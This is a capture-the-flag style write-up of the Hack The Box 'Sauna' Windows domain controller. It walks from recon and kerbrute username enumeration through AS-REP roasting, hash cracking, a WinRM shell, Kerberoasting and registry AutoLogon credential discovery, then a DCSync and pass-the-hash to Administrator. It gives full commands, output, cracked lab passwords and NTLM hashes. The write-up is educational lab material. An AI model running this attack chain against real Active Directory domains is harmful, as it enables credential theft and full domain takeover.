# Key Takeaways
- If no other initial access vectors are immediately present, using all information given to create a username list is worth the effort (user.txt).
- It is worth running multiple enumeration tools as well as looking for easy wins manually as some tools may not expose a privilege escalation vector as expected, wasting time (root.txt).

# Overview
- Platform: Windows
- HTB Rating: Easy - Medium

### Vulnerabilities
- Leveraging Kerberos Pre-Auth on a user opens the domain to potential initial access by exposing a user's password hash.
- Weak passwords on domain accounts provide a possible initial access vector due to brute forcing.
- Anonymous access is allowed to SMB, providing a possible enumeration vector.
- Excessive AD rights given to the svc_loanmgr user allows for a DCSync attack to occur, facilitating escalation and lateral movement.
- AutoLogon credentials are exposed in the registry to anyone with basic user access.

### Strengths
- Hardening against anonymous SMB and LDAP access prevents enumeration of domain/user information despite access being provided.

# Solving user.txt
I started this box with some generic nmap scans, looking for open ports.
```
└──╼ $sudo nmap -sS -oA allports -p- 10.10.10.175
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-10 22:44 EST
Nmap scan report for 10.10.10.175
Host is up (0.039s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49689/tcp open  unknown
49697/tcp open  unknown
```

I was immediately interesting in digging further into DNS (53), the webserver (80), SMB (445), RPC (135) and LDAP (389). I also noted that it appears port 5985 is open, which could potentially allow access via WinRM if we can get user account credentials.

An initial glance at DNS does not provide and further domain information.
```
└──╼ $dig any EGOTISTICAL-BANK.LOCAL @10.10.10.175

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> any EGOTISTICAL-BANK.LOCAL @10.10.10.175
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 55593
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;EGOTISTICAL-BANK.LOCAL.                IN      ANY

;; ANSWER SECTION:
EGOTISTICAL-BANK.LOCAL. 600     IN      A       10.10.10.175
EGOTISTICAL-BANK.LOCAL. 3600    IN      NS      sauna.EGOTISTICAL-BANK.LOCAL.
EGOTISTICAL-BANK.LOCAL. 3600    IN      SOA     sauna.EGOTISTICAL-BANK.LOCAL. hostmaster.EGOTISTICAL-BANK.LOCAL. 48 900 600 86400 3600
EGOTISTICAL-BANK.LOCAL. 600     IN      AAAA    dead:beef::d82a:5af8:762a:f639

;; ADDITIONAL SECTION:
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   A       10.10.10.175
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   AAAA    dead:beef::8568:3f67:20fa:8bfe

;; Query time: 36 msec
;; SERVER: 10.10.10.175#53(10.10.10.175) (TCP)
;; WHEN: Sat Jan 10 22:45:39 EST 2026
;; MSG SIZE  rcvd: 206


└──╼ $dig axfr EGOTISTICAL-BANK.LOCAL @10.10.10.175

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr EGOTISTICAL-BANK.LOCAL @10.10.10.175
;; global options: +cmd
; Transfer failed.
```

I moved onto SMB, noting that we can gain access via a NULL session, not no shares are listed.
```
└──╼ $smbclient -N -L \\\\10.10.10.175
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

I then tried to get more information, such as a user list, via RPC but was stopped again.
```
└──╼ $rpcclient -U "" -N 10.10.10.175
rpcclient $> querydominfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

I continued checking the interesting services, next coming to the webserver. Attempts at blind XSS via the contact forms failed. Submitting data was not possible as POST requests were blocked and attempting the same submissions via GET/HEAD did not help.

I used `ffuf` to look for interesting files/folders but found nothing of note.
```
└──╼ $ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -u "http://10.10.10.175/FUZZ" -ic -e .txt,.conf,.html

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.175/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .txt .conf .html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 44ms]
css                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 53ms]
index.html              [Status: 200, Size: 32797, Words: 15329, Lines: 684, Duration: 46ms]
contact.html            [Status: 200, Size: 15634, Words: 7370, Lines: 326, Duration: 48ms]
blog.html               [Status: 200, Size: 24695, Words: 11588, Lines: 471, Duration: 57ms]
about.html              [Status: 200, Size: 30954, Words: 14043, Lines: 641, Duration: 64ms]
Images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 62ms]
.                       [Status: 200, Size: 32797, Words: 15329, Lines: 684, Duration: 43ms]
fonts                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 43ms]
CSS                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 46ms]
Contact.html            [Status: 200, Size: 15634, Words: 7370, Lines: 326, Duration: 36ms]
Blog.html               [Status: 200, Size: 24695, Words: 11588, Lines: 471, Duration: 44ms]
About.html              [Status: 200, Size: 30954, Words: 14043, Lines: 641, Duration: 50ms]
Css                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 53ms]
Index.html              [Status: 200, Size: 32797, Words: 15329, Lines: 684, Duration: 47ms]
IMAGES                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 49ms]
Fonts                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 77ms]
single.html             [Status: 200, Size: 38059, Words: 20403, Lines: 685, Duration: 63ms]
ABOUT.html              [Status: 200, Size: 30954, Words: 14043, Lines: 641, Duration: 68ms]
BLOG.html               [Status: 200, Size: 24695, Words: 11588, Lines: 471, Duration: 48ms]
CONTACT.html            [Status: 200, Size: 15634, Words: 7370, Lines: 326, Duration: 51ms]
INDEX.html              [Status: 200, Size: 32797, Words: 15329, Lines: 684, Duration: 2373ms]
```

I also used `ffuf` to look for vhosts based on the `egotisitcal-bank.local` scheme, but found nothing.

Having exhausted most of my original ideas, I decided to attempt a username brute force against the Domain Controller using `kerbrute`. This was promising, as a number of usernames were found.
```
└──╼ $./kerbrute_linux_amd64 userenum -d egotistical-bank.local --dc 10.10.10.175 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/10/26 - Ronnie Flathers @ropnop

2026/01/10 23:29:46 >  Using KDC(s):
2026/01/10 23:29:46 >   10.10.10.175:88

2026/01/10 23:29:53 >  [+] VALID USERNAME:       administrator@egotistical-bank.local
2026/01/10 23:30:36 >  [+] VALID USERNAME:       hsmith@egotistical-bank.local
2026/01/10 23:30:42 >  [+] VALID USERNAME:       Administrator@egotistical-bank.local
2026/01/10 23:31:05 >  [+] VALID USERNAME:       fsmith@egotistical-bank.local
```

Now having some valid usernames, I began seeing if we could leverage those to further our access. I looked to see if Kerberos Pre-Auth was enabled on any of the users found. This returned an AS-REP hash for the `fsmith` user.
```
└──╼ $GetNPUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -no-pass -usersfile users.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:11cf6c034550e60743978eee3919b619$2253ad8960197be1e5758a6c8890dbd075fc33b00b6e668f133473ecbab420b66ae41ec92c9b8b7b4751c936dbabd6e0a6e0c4e3a8cb7c76f6a215f7515bb367159f695b8be116a8f421a94f0ad20fa16b68237a7d58218f2eebd6b136f6c0d14c03edf90437b6d3e449850c30f2b63da95b920b16b4a788bd3a822a316e5b3397281a2954cafe6f4962bac25fdd25ecf15c38bb07f8763aa8d2c3f07b8a2267d2d0619ff393de61d95912dea8f4df8c62b0e7fd56bb9e580ae464b4d5b3fb30d00293a7066529bb319c3b2631c83b81652164192b84854907b6b62cef494e24405f6a77bcd56b388e56fefa9ac3afaac1ff8e97c2136878edc0bef84db68843
```

I ran this through hashcat with the `rockyou.txt` wordlist and cracked the hash. This gave me the first set of valid credentials: `fsmith : Thestrokes23`
```
└──╼ $hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:11cf6c034550e60743978eee3919b619$2253ad8960197be1e5758a6c8890dbd075fc33b00b6e668f133473ecbab420b66ae41ec92c9b8b7b4751c936dbabd6e0a6e0c4e3a8cb7c76f6a215f7515bb367159f695b8be116a8f421a94f0ad20fa16b68237a7d58218f2eebd6b136f6c0d14c03edf90437b6d3e449850c30f2b63da95b920b16b4a788bd3a822a316e5b3397281a2954cafe6f4962bac25fdd25ecf15c38bb07f8763aa8d2c3f07b8a2267d2d0619ff393de61d95912dea8f4df8c62b0e7fd56bb9e580ae464b4d5b3fb30d00293a7066529bb319c3b2631c83b81652164192b84854907b6b62cef494e24405f6a77bcd56b388e56fefa9ac3afaac1ff8e97c2136878edc0bef84db68843:Thestrokes23
```

I then used these credentials to successfully log in via WinRM on port 5985.
```
└──╼ $evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/11/2026   2:38 AM             34 user.txt


*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
7134a67825f9a80520e093a6fcfda4e9
```

# Solving root.txt
Now that we had user-level access, it was time to run SharpHound and begin looking for possible AD escalation vectors by graphing the data in BloodHound.
```
*Evil-WinRM* PS C:\Users\FSmith\Documents> .\SharpHound_v1.exe -c All --zipfilename egotistical-bank
2026-01-11T04:41:37.8279147-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2026-01-11T04:41:37.9685405-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2026-01-11T04:41:37.9841697-08:00|INFORMATION|Initializing SharpHound at 4:41 AM on 1/11/2026
2026-01-11T04:41:38.0779128-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for EGOTISTICAL-BANK.LOCAL : SAUNA.EGOTISTICAL-BANK.LOCAL
2026-01-11T04:41:50.1560393-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2026-01-11T04:41:50.3904127-08:00|INFORMATION|Beginning LDAP search for EGOTISTICAL-BANK.LOCAL
2026-01-11T04:41:50.4217070-08:00|INFORMATION|Producer has finished, closing LDAP channel
2026-01-11T04:41:50.4372865-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-01-11T04:42:20.7029195-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM

 53 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2026-01-11T04:43:17.9060354-08:00|INFORMATION|SharpHound Enumeration Completed at 4:43 AM on 1/11/2026! Happy Graphing!
*Evil-WinRM* PS C:\Users\FSmith\Documents>
*Evil-WinRM* PS C:\Users\FSmith\Documents> dir

    Directory: C:\Users\FSmith\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/11/2026   4:43 AM          11624 20260111044246_egotistical-bank.zip
-a----        1/11/2026   4:40 AM        1052160 SharpHound_v1.exe
-a----        1/11/2026   4:43 AM           8601 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin


*Evil-WinRM* PS C:\Users\FSmith\Documents> download 20260111044246_egotistical-bank.zip
```

I used this data in BloodHound alongside a basic look at `net user` output to determine what possible next steps might be.
```
*Evil-WinRM* PS C:\Users\FSmith\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
```

Our current user, `fsmith`, didn't seem to have any interesting access. However, a quick glance at the `svc_loanmgr` outgoing privileges tells us that we could DCSync from that user. That would be a very quick way to get Domain Admin, if only we can find our way there.

<img width="869" height="303" alt="image" src="https://github.com/user-attachments/assets/19b4250f-0e87-4213-88bf-8f181dd68d23" />

I then ran a basic enumeration script (`winPEAS.bat`) on the server to see if there were any quick wins. This lead me to my first big mistake, as I overlooked important results within this script that could have saved me time searching in other places. Unlike winPEASany.exe which displays uncovered credentials directly in the output, I missed that there was a registry entry that could lead to possible clear-text credentials (CACHEDLOGONSCOUNT as part of the WinLogon reg key).
```
*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEAS.bat

            ((,.,/((((((((((((((((((((/,  */
     ,/*,..*(((((((((((((((((((((((((((((((((,
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
   ((((((((((((((((* *****,,,/########## .(* ,((((((
   (((((((((((/* ******************/####### .(. ((((((
   ((((((..******************/@@@@@/***/###### /((((((
   ,,..**********************@@@@@@@@@@(***,#### ../(((((
   , ,**********************#@@@@@#@@@@*********##((/ /((((
   ..(((##########*********/#@@@@@@@@@/*************,,..((((
   .(((################(/******/@@@@@#****************.. /((
   .((########################(/************************..*(
   .((#############################(/********************.,(
   .((##################################(/***************..(
   .((######################################(************..(
   .((######(,.***.,(###################(..***(/*********..(
   .((######*(#####((##################((######/(********..(
   .((##################(/**********(################(**...(
   .(((####################/*******(###################.((((
   .(((((############################################/  /((
   ..(((((#########################################(..(((((.
   ....(((((#####################################( .((((((.
   ......(((((#################################( .(((((((.
   (((((((((. ,(############################(../(((((((((.
       (((((((((/,  ,####################(/..((((((((((.
             (((((((((/,.  ,*//////*,. ./(((((((((((.
                (((((((((((((((((((((((((((/
                       by carlospolop


/!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script
   WinPEAS should be used for authorized penetration testing and/or educational purposes only.
   Any misuse of this software will not be the responsibility of the author or of any other collaborator.
   Use it at your own networks and/or with the network owner's permission.

[*] BASIC SYSTEM INFO
 [+] WINDOWS OS
   [i] Check for vulnerabilities for the OS version with the applied patches
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
winPEAS.bat : Access is denied.
    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

ERROR:
Description = Access denied

Access is denied.

 [+] DATE and TIME
   [i] You may need to adjust your local date/time to exploit some vulnerability
Tue 01/13/2026
01:35 AM

 [+] Audit Settings
   [i] Check what is being logged


 [+] WEF Settings
   [i] Check where are being sent the logs

 [+] LAPS installed?
   [i] Check what is being logged

 [+] LSA protection?
   [i] Active if "1"


 [+] Credential Guard?
   [i] Active if "1" or "2"



 [+] WDigest?
   [i] Plain-text creds in memory if "1"

 [+] Number of cached creds
   [i] You need System-rights to extract them

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    CACHEDLOGONSCOUNT    REG_SZ    10

 [+] UAC Settings
   [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1


 [+] Registered Anti-Virus(AV)
ERROR:
Description = Invalid namespace

Checking for defender whitelisted PATHS

 [+] PowerShell settings
PowerShell v2 Version:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
    PowerShellVersion    REG_SZ    2.0

PowerShell v5 Version:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
    PowerShellVersion    REG_SZ    5.1.17763.1

Transcriptions Settings:
Module logging settings:
Scriptblog logging settings:

PS default transcript history

Checking PS history file

 [+] MOUNTED DISKS
   [i] Maybe you find something interesting


 [+] ENVIRONMENT
   [i] Interesting information?

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\FSmith\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=SAUNA
ComSpec=C:\Windows\system32\cmd.exe
CurrentFolder=C:\Users\FSmith\Documents\
CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT
DriverData=C:\Windows\System32\Drivers\DriverData
E=0x1B[
expl=no
LOCALAPPDATA=C:\Users\FSmith\AppData\Local
long=false
NUMBER_OF_PROCESSORS=2
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\FSmith\AppData\Local\Microsoft\WindowsApps
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
Percentage=1
PercentageTrack=19
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
PROCESSOR_LEVEL=25
PROCESSOR_REVISION=0101
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Users\FSmith\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\FSmith\AppData\Local\Temp
TMP=C:\Users\FSmith\AppData\Local\Temp
USERDNSDOMAIN=EGOTISTICAL-BANK.LOCAL
USERDOMAIN=EGOTISTICALBANK
USERNAME=FSmith
USERPROFILE=C:\Users\FSmith
windir=C:\Windows

 [+] INSTALLED SOFTWARE
   [i] Some weird software? Check for vulnerabilities in unknow software installed
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software

Common Files
Common Files
internet explorer
Internet Explorer
Microsoft.NET
VMware
Windows Defender
Windows Defender
Windows Defender Advanced Threat Protection
Windows Mail
Windows Mail
Windows Media Player
Windows Media Player
Windows Multimedia Platform
Windows Multimedia Platform
windows nt
windows nt
Windows Photo Viewer
Windows Photo Viewer
Windows Portable Devices
Windows Portable Devices
Windows Security
WindowsPowerShell
WindowsPowerShell
    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\

 [+] Remote Desktop Credentials Manager
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager

 [+] WSUS
   [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus

 [+] RUNNING PROCESSES
   [i] Something unexpected is running? Check for vulnerabilities
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes
ERROR: Access denied

   [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)
ERROR:
Description = Access denied

   [i] Checking directory permissions of running processes (DLL injection)
ERROR:
Description = Access denied

 [+] RUN AT STARTUP
   [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#run-at-startup
C:\Documents and Settings\All Users\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)

Access is denied.
```

Missing the important information in the winPEAS script, I moved on to check to see if any users were Kerberoastable. It appears that the `hsmith` user is setup with an SPN.
```
└──╼ $sudo ntpdate 10.10.10.175
2026-01-11 08:01:37.848679 (-0500) +28801.158441 +/- 0.024208 10.10.10.175 s1 no-leap
CLOCK: time stepped by 28801.158441

└──╼ $GetUserSPNs.py egotistical-bank.local/fsmith:Thestrokes23 -dc-ip 10.10.10.175 -request-user hsmith

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 00:54:34.140321  <never>



[-] CCache file is not found. Skipping...
$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$e51432bd1fe3f6b75f634050d2052438$1580afd70b8b7e5c8b367f8609ec6bc83dbd515fcb90a773827b419dfa82793f5c2a645b65a1a94f45<SNIP>
```

```
└──╼ $hashcat -m 13100 hsmith.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$e51432bd1fe3f6b75f634050d2052438$1580afd70b8b7e5c8b367f8609ec6bc83dbd515fcb90a773<SNIP>:Thestrokes23
```

This revealed the same password as `fsmith`, however `hsmith` doesn't have the same Windows Remote Management permissions, and so isn't as useful of an account. I did then look for password reuse across the other accounts (svc_loanmgr) as well as privileges to SMB shares, but this didn't provide any further access.

While looking at our SMB access with our new `fsmith` credentials, I noted that we have WRITE access to an interesting directory, "RICOH Aficio SP 8300DN PCL 6".
```
└──╼ $nxc smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23
SMB         10.10.10.175    445    SAUNA            [*] Enumerated shares
SMB         10.10.10.175    445    SAUNA            Share           Permissions     Remark
SMB         10.10.10.175    445    SAUNA            -----           -----------     ------
SMB         10.10.10.175    445    SAUNA            ADMIN$                          Remote Admin
SMB         10.10.10.175    445    SAUNA            C$                              Default share
SMB         10.10.10.175    445    SAUNA            IPC$            READ            Remote IPC
SMB         10.10.10.175    445    SAUNA            NETLOGON        READ            Logon server share
SMB         10.10.10.175    445    SAUNA            print$          READ            Printer Drivers
SMB         10.10.10.175    445    SAUNA            RICOH Aficio SP 8300DN PCL 6 WRITE           We cant print money
SMB         10.10.10.175    445    SAUNA            SYSVOL          READ            Logon server share
```

This ended up throwing me off and wasting a bunch of my time due to there being PoC exploit code written for this exact printer driver, found [here](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/). Attempting to exploit this manually and with Metasploit however simply resulted in the code hanging and no privileged access.

Finally, I returned to attempting some more manual enumeration of the machine. As part of common checks for clear-text credentials, I ran the following query to look for WinLogon credentials.
```
*Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x156458a35
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

In the output above, it is found that there is AutoLogon credentials. We see the `DefaultUserName` of `svc_loanmanager` and `DefaultPassword` of `Moneymakestheworldgoround!`.

Knowing from our BloodHound output prior that access to the `svc_loanmgr` account would give us DCSync privileges, I immediately attempted this attack.
```
└──╼ $secretsdump.py -just-dc egotistical-bank/svc_loanmgr@10.10.10.175

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:bf6e45dd5754af5fae9081d55bee6718:::
<SNIP>
[*] Cleaning up...
```

This gives us the NTLM hash of the Administrator user, allowing use of the `psexec.py` tool to attempt to Pass the Hash and connect to the DC with full Admin rights. This is successful and allows us to view the flag at `C:\Users\Administrator\Desktop\root.txt`.
```
└──╼ $psexec.py egotistical-bank.local/Administrator@10.10.10.175 -hashes :823452073d75b9d1cf70ebdf86c7f98e

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file FeQvztwv.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service Kmrz on 10.10.10.175.....
[*] Starting service Kmrz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 489C-D8FC

 Directory of C:\Users\Administrator\Desktop

07/14/2021  02:35 PM    <DIR>          .
07/14/2021  02:35 PM    <DIR>          ..
01/12/2026  03:17 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   7,686,995,968 bytes free

